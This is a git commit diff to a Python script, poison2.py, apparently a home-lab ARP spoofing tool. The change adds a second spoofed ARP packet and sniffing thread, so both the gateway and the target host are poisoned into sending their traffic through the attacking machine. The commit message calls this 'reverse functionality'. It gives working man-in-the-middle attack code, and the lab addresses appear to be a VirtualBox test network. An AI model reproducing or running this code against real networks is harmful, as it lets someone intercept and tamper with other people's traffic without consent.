99124e7afcb5f0fea03de3448a276a6c8ccbd461
Mitch <mitchschmidt21@gmail.com>
2016-04-14 15:59:52 -0400

    Update poison2.py
    Added reverse functionality (packet2 and thread2)

--- poison2.py
+++ poison2.py
@@ -3,6 +3,8 @@
 #gateway is at .100, 08:00:27:3b:24:84
 #attacking host is at .101, 08:00:27:f3:17:4b
 #target host is at .102, 08:00:27:c5:1e:3c
+#want to make threads save packets to a pcap file
+#want to make a keyboardinterrupt save files and close threads
 
 import socket, sys, time, threading, binascii, struct
 from struct import *
@@ -55,21 +57,28 @@ def main():
     targetip = "192.168.56.102"
     sourceip = "192.168.56.101"
     destip = "192.168.56.100"
-    
+
+    targetmac = macaddrtobytestr("08:00:27:c5:1e:3c")
     sourcemac = macaddrtobytestr("08:00:27:f3:17:4b")
     destmac = macaddrtobytestr("08:00:27:3b:24:84")
-    targetmac = macaddrtobytestr("08:00:27:c5:1e:3c")
 
     sourceaddr = socket.inet_aton(sourceip)
     destaddr = socket.inet_aton(destip)
     targetaddr = socket.inet_aton(targetip)
     
+    #set up poisoning for gateway, forward packets to target
     poisonpacket1 = arppacket(destmac, destaddr, sourcemac, targetaddr)
-    t = threading.Thread(target=packetsniff, args=(targetaddr, targetmac, sourcemac))
-    t.start()
-    
+    t1 = threading.Thread(target=packetsniff, args=(targetaddr, targetmac, sourcemac))
+    t1.start()
+
+    #set up poisoning for target, forward packets to gateway
+    poisonpacket2 = arppacket(targetmac, targetaddr, sourcemac, destaddr)
+    t2 = threading.Thread(target=packetsniff, args=(destaddr, destmac, sourcemac))
+    t2.start()
+
     while True:
         s.send(poisonpacket1)
+        s.send(poisonpacket2)
         time.sleep(7)
 
 if __name__ == "__main__":
